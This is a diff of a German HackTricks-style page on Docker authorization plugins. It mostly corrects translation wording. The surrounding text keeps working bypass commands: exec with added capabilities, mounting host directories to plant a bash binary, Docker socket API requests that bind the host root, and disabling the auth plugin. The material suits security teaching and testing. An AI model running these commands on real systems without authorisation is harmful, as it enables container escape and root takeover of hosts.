@@ -1,10 +1,10 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker**'s standard **Autorisierungs**modell ist **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-**Befehle** ausführen. Das Gleiche gilt für Aufrufer, die die Docker-Engine-API verwenden, um den Daemon zu kontaktieren. Wenn Sie **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungs-Plugins** erstellen und diese zu Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungs-Plugin kann ein Docker-Administrator **feingranulare Zugriffs**richtlinien zur Verwaltung des Zugriffs auf den Docker-Daemon **konfigurieren**.
+**Docker**'s standard **Autorisierungs**modell ist **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-**Befehle** ausführen. Das Gleiche gilt für Aufrufer, die die Docker-Engine-API verwenden, um den Daemon zu kontaktieren. Wenn Sie **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungs-Plugins** erstellen und diese zu Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungs-Plugin kann ein Docker-Administrator **feingranulare Zugriffs**richtlinien für die Verwaltung des Zugriffs auf den Docker-Daemon konfigurieren.
 
 # Grundarchitektur
 
-Docker Auth-Plugins sind **externe** **Plugins**, die Sie verwenden können, um **Aktionen** zu **erlauben/zu verweigern**, die an den Docker-Daemon **angefordert** werden, **abhängig** von dem **Benutzer**, der sie angefordert hat, und der **angeforderten** **Aktion**.
+Docker Auth-Plugins sind **externe** **Plugins**, die Sie verwenden können, um **Aktionen** zu **erlauben/zu verweigern**, die an den Docker-Daemon **abhängig** vom **Benutzer**, der sie angefordert hat, und der **angeforderten** **Aktion** gestellt werden.
 
 **[Die folgenden Informationen stammen aus den Dokumenten](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
@@ -20,7 +20,7 @@ Jede an das Plugin gesendete Anfrage **enthält den authentifizierten Benutzer, 
 
 Für Befehle, die potenziell die HTTP-Verbindung übernehmen können (`HTTP Upgrade`), wie `exec`, wird das Autorisierungs-Plugin nur für die anfänglichen HTTP-Anfragen aufgerufen. Sobald das Plugin den Befehl genehmigt, wird die Autorisierung nicht auf den Rest des Flusses angewendet. Insbesondere werden die Streaming-Daten nicht an die Autorisierungs-Plugins übergeben. Für Befehle, die chunked HTTP-Antworten zurückgeben, wie `logs` und `events`, wird nur die HTTP-Anfrage an die Autorisierungs-Plugins gesendet.
 
-Während der Verarbeitung von Anfrage/Aantwort müssen einige Autorisierungsflüsse möglicherweise zusätzliche Abfragen an den Docker-Daemon durchführen. Um solche Flüsse abzuschließen, können Plugins die Daemon-API ähnlich wie ein regulärer Benutzer aufrufen. Um diese zusätzlichen Abfragen zu ermöglichen, muss das Plugin die Mittel bereitstellen, damit ein Administrator geeignete Authentifizierungs- und Sicherheitsrichtlinien konfigurieren kann.
+Während der Verarbeitung von Anfrage/Antwort müssen einige Autorisierungsflüsse möglicherweise zusätzliche Abfragen an den Docker-Daemon durchführen. Um solche Flüsse abzuschließen, können Plugins die Daemon-API ähnlich wie ein regulärer Benutzer aufrufen. Um diese zusätzlichen Abfragen zu ermöglichen, muss das Plugin die Mittel bereitstellen, damit ein Administrator geeignete Authentifizierungs- und Sicherheitsrichtlinien konfigurieren kann.
 
 ## Mehrere Plugins
 
@@ -30,7 +30,7 @@ Sie sind verantwortlich für die **Registrierung** Ihres **Plugins** als Teil de
 
 ## Twistlock AuthZ Broker
 
-Das Plugin [**authz**](https://github.com/twistlock/authz) ermöglicht es Ihnen, eine einfache **JSON**-Datei zu erstellen, die das **Plugin** zum **Lesen** der Anfragen verwenden wird. Daher haben Sie die Möglichkeit, sehr einfach zu steuern, welche API-Endpunkte jeden Benutzer erreichen können.
+Das Plugin [**authz**](https://github.com/twistlock/authz) ermöglicht es Ihnen, eine einfache **JSON**-Datei zu erstellen, die das **Plugin** zum **Autorisieren** der Anfragen **lesen** wird. Daher haben Sie die Möglichkeit, sehr einfach zu steuern, welche API-Endpunkte jeden Benutzer erreichen können.
 
 Dies ist ein Beispiel, das es Alice und Bob erlaubt, neue Container zu erstellen: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
@@ -42,13 +42,13 @@ Sie finden ein **einfach zu verstehendes Plugin** mit detaillierten Informatione
 
 Lesen Sie die `README` und den `plugin.go`-Code, um zu verstehen, wie es funktioniert.
 
-# Docker Auth Plugin Umgehung
+# Docker Auth Plugin Bypass
 
 ## Zugriff auflisten
 
-Die wichtigsten Punkte, die zu überprüfen sind, sind die **welche Endpunkte erlaubt sind** und **welche Werte von HostConfig erlaubt sind**.
+Die wichtigsten Punkte, die zu überprüfen sind, sind **welche Endpunkte erlaubt sind** und **welche Werte von HostConfig erlaubt sind**.
 
-Um diese Auflistung durchzuführen, können Sie **das Tool** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Um diese Auflistung durchzuführen, können Sie das Tool [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
 ## nicht erlaubtes `run --privileged`
 
@@ -76,11 +76,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Jetzt kann der Benutzer den Container mit einer der [**zuvor besprochenen Techniken**](./#privileged-flag) verlassen und **Privilegien eskalieren** innerhalb des Hosts.
+Jetzt kann der Benutzer den Container mit einer der [**zuvor besprochenen Techniken**](#privileged-flag) verlassen und **Privilegien** im Host eskalieren.
 
 ## Schreibbares Verzeichnis einbinden
 
-In diesem Fall **verbot der Sysadmin den Benutzern, Container mit dem `--privileged`-Flag auszuführen** oder dem Container zusätzliche Berechtigungen zu geben, und er erlaubte nur das Einbinden des Verzeichnisses `/tmp`:
+In diesem Fall **verbot der Sysadmin den Benutzern, Container mit dem `--privileged`-Flag** auszuführen oder dem Container zusätzliche Berechtigungen zu geben, und er erlaubte nur das Einbinden des Verzeichnisses `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -98,7 +98,7 @@ host> /tmp/bash
 
 ## Unchecked API Endpoint
 
-Die Verantwortung des Sysadmins, der dieses Plugin konfiguriert, besteht darin, zu kontrollieren, welche Aktionen und mit welchen Berechtigungen jeder Benutzer ausführen kann. Daher könnte der Admin, wenn er einen **Blacklist**-Ansatz mit den Endpunkten und den Attributen verfolgt, **einige davon vergessen**, die einem Angreifer ermöglichen könnten, **Privilegien zu eskalieren.**
+Die Verantwortung des Sysadmins, der dieses Plugin konfiguriert, besteht darin, zu kontrollieren, welche Aktionen und mit welchen Berechtigungen jeder Benutzer ausführen kann. Daher könnte der Admin, wenn er einen **Blacklist**-Ansatz mit den Endpunkten und den Attributen verfolgt, **einige davon vergessen**, die es einem Angreifer ermöglichen könnten, **Privilegien zu eskalieren.**
 
 Sie können die Docker-API unter [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) überprüfen.
 
@@ -122,7 +122,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 
 ### Binds in HostConfig
 
-Befolgen Sie die gleichen Anweisungen wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
+Befolgen Sie die gleichen Anweisungen wie bei **Binds in root** und führen Sie diese **Anfrage** an die Docker API aus:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
@@ -169,7 +169,7 @@ docker plugin enable authobot
 ```
 Denke daran, das **Plugin nach der Eskalation wieder zu aktivieren**, oder ein **Neustart des Docker-Dienstes funktioniert nicht**!
 
-## Auth Plugin Bypass Berichte
+## Auth Plugin Bypass Writeups
 
 - [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
